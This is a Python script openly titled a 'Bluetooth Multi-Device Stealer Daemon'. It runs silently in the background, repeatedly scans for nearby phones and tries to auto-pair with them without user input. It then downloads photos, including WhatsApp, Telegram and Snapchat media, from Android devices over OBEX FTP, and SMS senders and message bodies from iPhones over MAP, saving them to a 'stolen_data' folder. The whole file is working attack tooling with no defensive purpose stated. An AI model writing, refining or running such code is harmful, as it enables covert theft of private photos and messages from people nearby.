#BY معتزشويه
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Bluetooth Multi-Device Stealer Daemon
Automatically downloads:
- Photos from Android (Samsung, etc.) via FTP
- SMS messages from iPhone via MAP
Runs silently in background with no user interaction.
"""

import subprocess
import re
import time
import os
import signal
import sys
import logging
from datetime import datetime
from pathlib import Path
import shutil
import select

# ================= CONFIG =================
SCAN_INTERVAL = 30
PAIRING_TIMEOUT = 60
FTP_TIMEOUT = 30
MAP_TIMEOUT = 20
DOWNLOAD_TIMEOUT = 300
OUTPUT_DIR = Path("stolen_data")
TEMP_DIR = Path("/tmp/bt_stealer")
LOG_FILE = "bt_stealer.log"
PID_FILE = "/tmp/bt_stealer_daemon.pid"

# Image file extensions to download (Android)
IMAGE_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp'}

# Common folders to search for images on Android
SEARCH_PATHS = [
    "DCIM",
    "Pictures",
    "Download",
    "WhatsApp/Media/WhatsApp Images",
    "Telegram/Telegram Images",
    "Instagram",
    "Snapchat",
    "Facebook"
]

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        # No console output for silent operation
    ]
)

running = True
processed_devices = set()

# ================= SIGNAL =================
def signal_handler(sig, frame):
    global running
    logging.warning("Stopping service...")
    running = False
    if PID_FILE.exists():
        PID_FILE.unlink()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ================= UTILS =================
def check_dependencies():
    required = ["bluetoothctl", "sdptool", "obexftp"]
    missing = [tool for tool in required if not shutil.which(tool)]
    if missing:
        logging.error(f"Missing dependencies: {', '.join(missing)}")
        return False
    return True

def run_cmd(cmd, timeout=30, check=False):
    try:
        res = subprocess.run(
            cmd, shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=check
        )
        return res.stdout.strip()
    except subprocess.TimeoutExpired:
        logging.error(f"Timeout: {cmd}")
        return ""
    except subprocess.CalledProcessError as e:
        logging.error(f"CMD failed ({e.returncode}): {cmd}\n{e.stderr}")
        return ""
    except Exception as e:
        logging.error(f"CMD error: {e}")
        return ""

def setup_bluetooth_agent():
    logging.info("Configuring Bluetooth agent (NoInputNoOutput)")
    run_cmd("bluetoothctl agent NoInputNoOutput")
    run_cmd("bluetoothctl default-agent")
    time.sleep(2)

def is_bluetooth_on():
    out = run_cmd("bluetoothctl show")
    return "Powered: yes" in out

def power_on_bluetooth():
    logging.info("Powering on Bluetooth")
    run_cmd("bluetoothctl power on")

def get_device_info(mac):
    """Get detailed info about a device including manufacturer if available."""
    out = run_cmd(f"bluetoothctl info {mac}")
    return out

def is_iphone(mac, name):
    """Guess if device is iPhone based on name or manufacturer data."""
    name_lower = name.lower()
    if any(key in name_lower for key in ['iphone', 'ipad', 'ios', 'apple']):
        return True
    # Check manufacturer from info
    info = get_device_info(mac)
    if 'Apple' in info or 'iPhone' in info:
        return True
    return False

def is_trusted(mac):
    out = run_cmd(f"bluetoothctl info {mac}")
    return "Trusted: yes" in out

def pair_device(mac):
    """Pair with device using NoInputNoOutput agent."""
    logging.info(f"Pairing with {mac} (auto-accept)")
    run_cmd(f"bluetoothctl remove {mac}")
    time.sleep(2)

    proc = subprocess.Popen(
        ["bluetoothctl", "pair", mac],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1
    )

    start_time = time.time()
    success = False
    while time.time() - start_time < PAIRING_TIMEOUT:
        reads, _, _ = select.select([proc.stdout], [], [], 0.5)
        if reads:
            line = proc.stdout.readline()
            if not line:
                continue
            line = line.strip()
            logging.debug(f"bluetoothctl: {line}")
            if "Pairing successful" in line:
                success = True
                break
            elif "Failed to pair" in line or "Agent refused" in line:
                break
        if proc.poll() is not None:
            break

    proc.terminate()
    proc.wait(timeout=2)

    if success:
        logging.info(f"Pairing successful with {mac}")
        run_cmd(f"bluetoothctl trust {mac}")
        return True
    else:
        logging.error(f"Pairing failed with {mac}")
        return False

# ================= ANDROID FTP PHOTO DOWNLOAD =================
def supports_ftp(mac):
    out = run_cmd(f"sdptool browse {mac}", timeout=15)
    return "File Transfer" in out

def get_ftp_channel(mac):
    out = run_cmd(f"sdptool browse {mac}", timeout=15)
    in_ftp = False
    for line in out.splitlines():
        if "Service Name: File Transfer" in line:
            in_ftp = True
        if in_ftp and "Channel" in line:
            match = re.search(r'Channel\s*:\s*(\d+)', line)
            if match:
                return match.group(1)
    return None

def list_ftp_dir(mac, channel, path="/"):
    cmd = f"obexftp -b {mac} -B {channel} -l '{path}'"
    out = run_cmd(cmd, timeout=FTP_TIMEOUT)
    items = []
    for line in out.splitlines():
        line = line.strip()
        if not line or line.startswith("connecting"):
            continue
        parts = line.split()
        if len(parts) >= 1:
            name = parts[-1]
            is_dir = line.startswith('d')
            items.append((name, is_dir))
    return items

def download_file(mac, channel, remote_path, local_path):
    cmd = f"obexftp -b {mac} -B {channel} -g '{remote_path}' -o '{local_path}'"
    run_cmd(cmd, timeout=DOWNLOAD_TIMEOUT)
    return local_path.exists()

def download_photos_from_android(mac, channel, device_name):
    """Recursively download all images from common Android folders."""
    device_dir = OUTPUT_DIR / f"{re.sub(r'[^a-zA-Z0-9]', '_', device_name)}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    device_dir.mkdir(parents=True, exist_ok=True)
    logging.info(f"Downloading photos to {device_dir}")

    downloaded = 0

    def scan_and_download(remote_path, local_base):
        nonlocal downloaded
        items = list_ftp_dir(mac, channel, remote_path)
        for name, is_dir in items:
            remote_full = f"{remote_path}/{name}" if remote_path != "/" else f"/{name}"
            if name in (".", ".."):
                continue
            if is_dir:
                scan_and_download(remote_full, local_base)
            else:
                ext = Path(name).suffix.lower()
                if ext in IMAGE_EXTENSIONS:
                    rel_path = remote_full.lstrip('/')
                    local_file = local_base / rel_path
                    local_file.parent.mkdir(parents=True, exist_ok=True)
                    if download_file(mac, channel, remote_full, local_file):
                        downloaded += 1
                        logging.debug(f"Downloaded: {remote_full}")
                    else:
                        logging.warning(f"Failed to download: {remote_full}")

    for base in SEARCH_PATHS:
        remote_base = f"/{base}"
        scan_and_download(remote_base, device_dir)

    logging.info(f"Downloaded {downloaded} photos from {device_name}")
    return downloaded

# ================= IPHONE MAP SMS DOWNLOAD =================
def supports_map(mac):
    out = run_cmd(f"sdptool browse {mac}", timeout=15)
    return "Message Access" in out

def get_map_channel(mac):
    out = run_cmd(f"sdptool browse {mac}", timeout=15)
    in_map = False
    for line in out.splitlines():
        if "Service Name: Message Access" in line:
            in_map = True
        if in_map and "Channel" in line:
            match = re.search(r'Channel\s*:\s*(\d+)', line)
            if match:
                return match.group(1)
    return None

def download_sms_from_iphone(mac, channel, device_name):
    """Download SMS messages via MAP (iPhone)."""
    OUTPUT_DIR.mkdir(exist_ok=True)
    TEMP_DIR.mkdir(exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_name = re.sub(r'[^a-zA-Z0-9]', '_', device_name)
    output_file = OUTPUT_DIR / f"{safe_name}_sms_{timestamp}.txt"

    logging.info(f"Downloading SMS messages from iPhone {device_name}")

    listing = run_cmd(f"obexftp -b {mac} -B {channel} -l 'telecom/msg/'", timeout=MAP_TIMEOUT)
    vmg_files = re.findall(r'(\S+\.vmg)', listing)

    if not vmg_files:
        logging.warning("No VMG files found on iPhone")
        return False

    messages = []
    for f in vmg_files:
        local = TEMP_DIR / f
        run_cmd(f"obexftp -b {mac} -B {channel} -g 'telecom/msg/{f}' -o '{local}'", timeout=MAP_TIMEOUT)

        try:
            with open(local, encoding="utf-8", errors="ignore") as fp:
                data = fp.read()
            sender = re.search(r'TEL:(\+?\d+)', data)
            body = re.search(r'BODY:(.*?)(?=END:VENV|$)', data, re.S | re.I)
            if sender and body:
                messages.append((sender.group(1), body.group(1).strip()))
        except Exception as e:
            logging.error(f"Error parsing {f}: {e}")

    with open(output_file, "w", encoding="utf-8") as f:
        for s, b in messages:
            f.write(f"From: {s}\nMessage: {b}\n{'-'*40}\n")

    logging.info(f"Saved {len(messages)} SMS messages -> {output_file}")
    shutil.rmtree(TEMP_DIR, ignore_errors=True)
    return True

# ================= MAIN PROCESS =================
def process_device(mac, name):
    """Detect device type and launch appropriate download."""
    if mac in processed_devices:
        return

    logging.info(f"New device detected: {name} ({mac})")

    # Determine if likely iPhone or Android
    iphone = is_iphone(mac, name)
    if iphone:
        logging.info("Device identified as iPhone (or Apple device)")
    else:
        logging.info("Device identified as Android (likely)")

    # Ensure device is trusted (pair if needed)
    if not is_trusted(mac):
        logging.info(f"Device {mac} not trusted, starting auto-pair")
        if not pair_device(mac):
            logging.warning(f"Could not pair with {mac}")
            return
    else:
        logging.info(f"Device {mac} already trusted")

    # Try appropriate method based on device type
    if iphone:
        # iPhone: try MAP (SMS)
        if not supports_map(mac):
            logging.warning("iPhone does not support MAP? Aborting.")
            return
        channel = get_map_channel(mac)
        if not channel:
            logging.error("MAP channel not found for iPhone")
            return
        success = download_sms_from_iphone(mac, channel, name)
        if success:
            processed_devices.add(mac)
            logging.info(f"Successfully processed iPhone {mac}")
        else:
            logging.warning(f"Failed to download SMS from iPhone {mac}")
    else:
        # Android: try FTP (photos)
        if not supports_ftp(mac):
            logging.warning("Android device does not support FTP? Aborting.")
            return
        channel = get_ftp_channel(mac)
        if not channel:
            logging.error("FTP channel not found for Android")
            return
        count = download_photos_from_android(mac, channel, name)
        if count > 0:
            processed_devices.add(mac)
            logging.info(f"Successfully processed Android {mac}, downloaded {count} photos")
        else:
            logging.warning(f"No photos downloaded from Android {mac}")

# ================= MAIN LOOP =================
def main():
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

    if not check_dependencies():
        sys.exit(1)

    if not is_bluetooth_on():
        power_on_bluetooth()
        time.sleep(2)

    setup_bluetooth_agent()
    logging.info("Bluetooth Multi-Device Stealer Daemon started (silent mode)")

    global running
    while running:
        try:
            devices = scan_devices()
            for mac, name in devices:
                process_device(mac, name)

            for _ in range(SCAN_INTERVAL):
                if not running:
                    break
                time.sleep(1)
        except Exception as e:
            logging.error(f"Unhandled exception: {e}")
            time.sleep(5)

    logging.info("Service stopped")

def scan_devices():
    logging.info("Scanning for devices...")
    run_cmd("bluetoothctl scan on", timeout=2)
    time.sleep(5)
    out = run_cmd("bluetoothctl devices", timeout=5)
    devices = []
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[0] == "Device":
            mac = parts[1].upper()
            name = " ".join(parts[2:])
            devices.append((mac, name))
    return devices

if __name__ == "__main__":
    main()
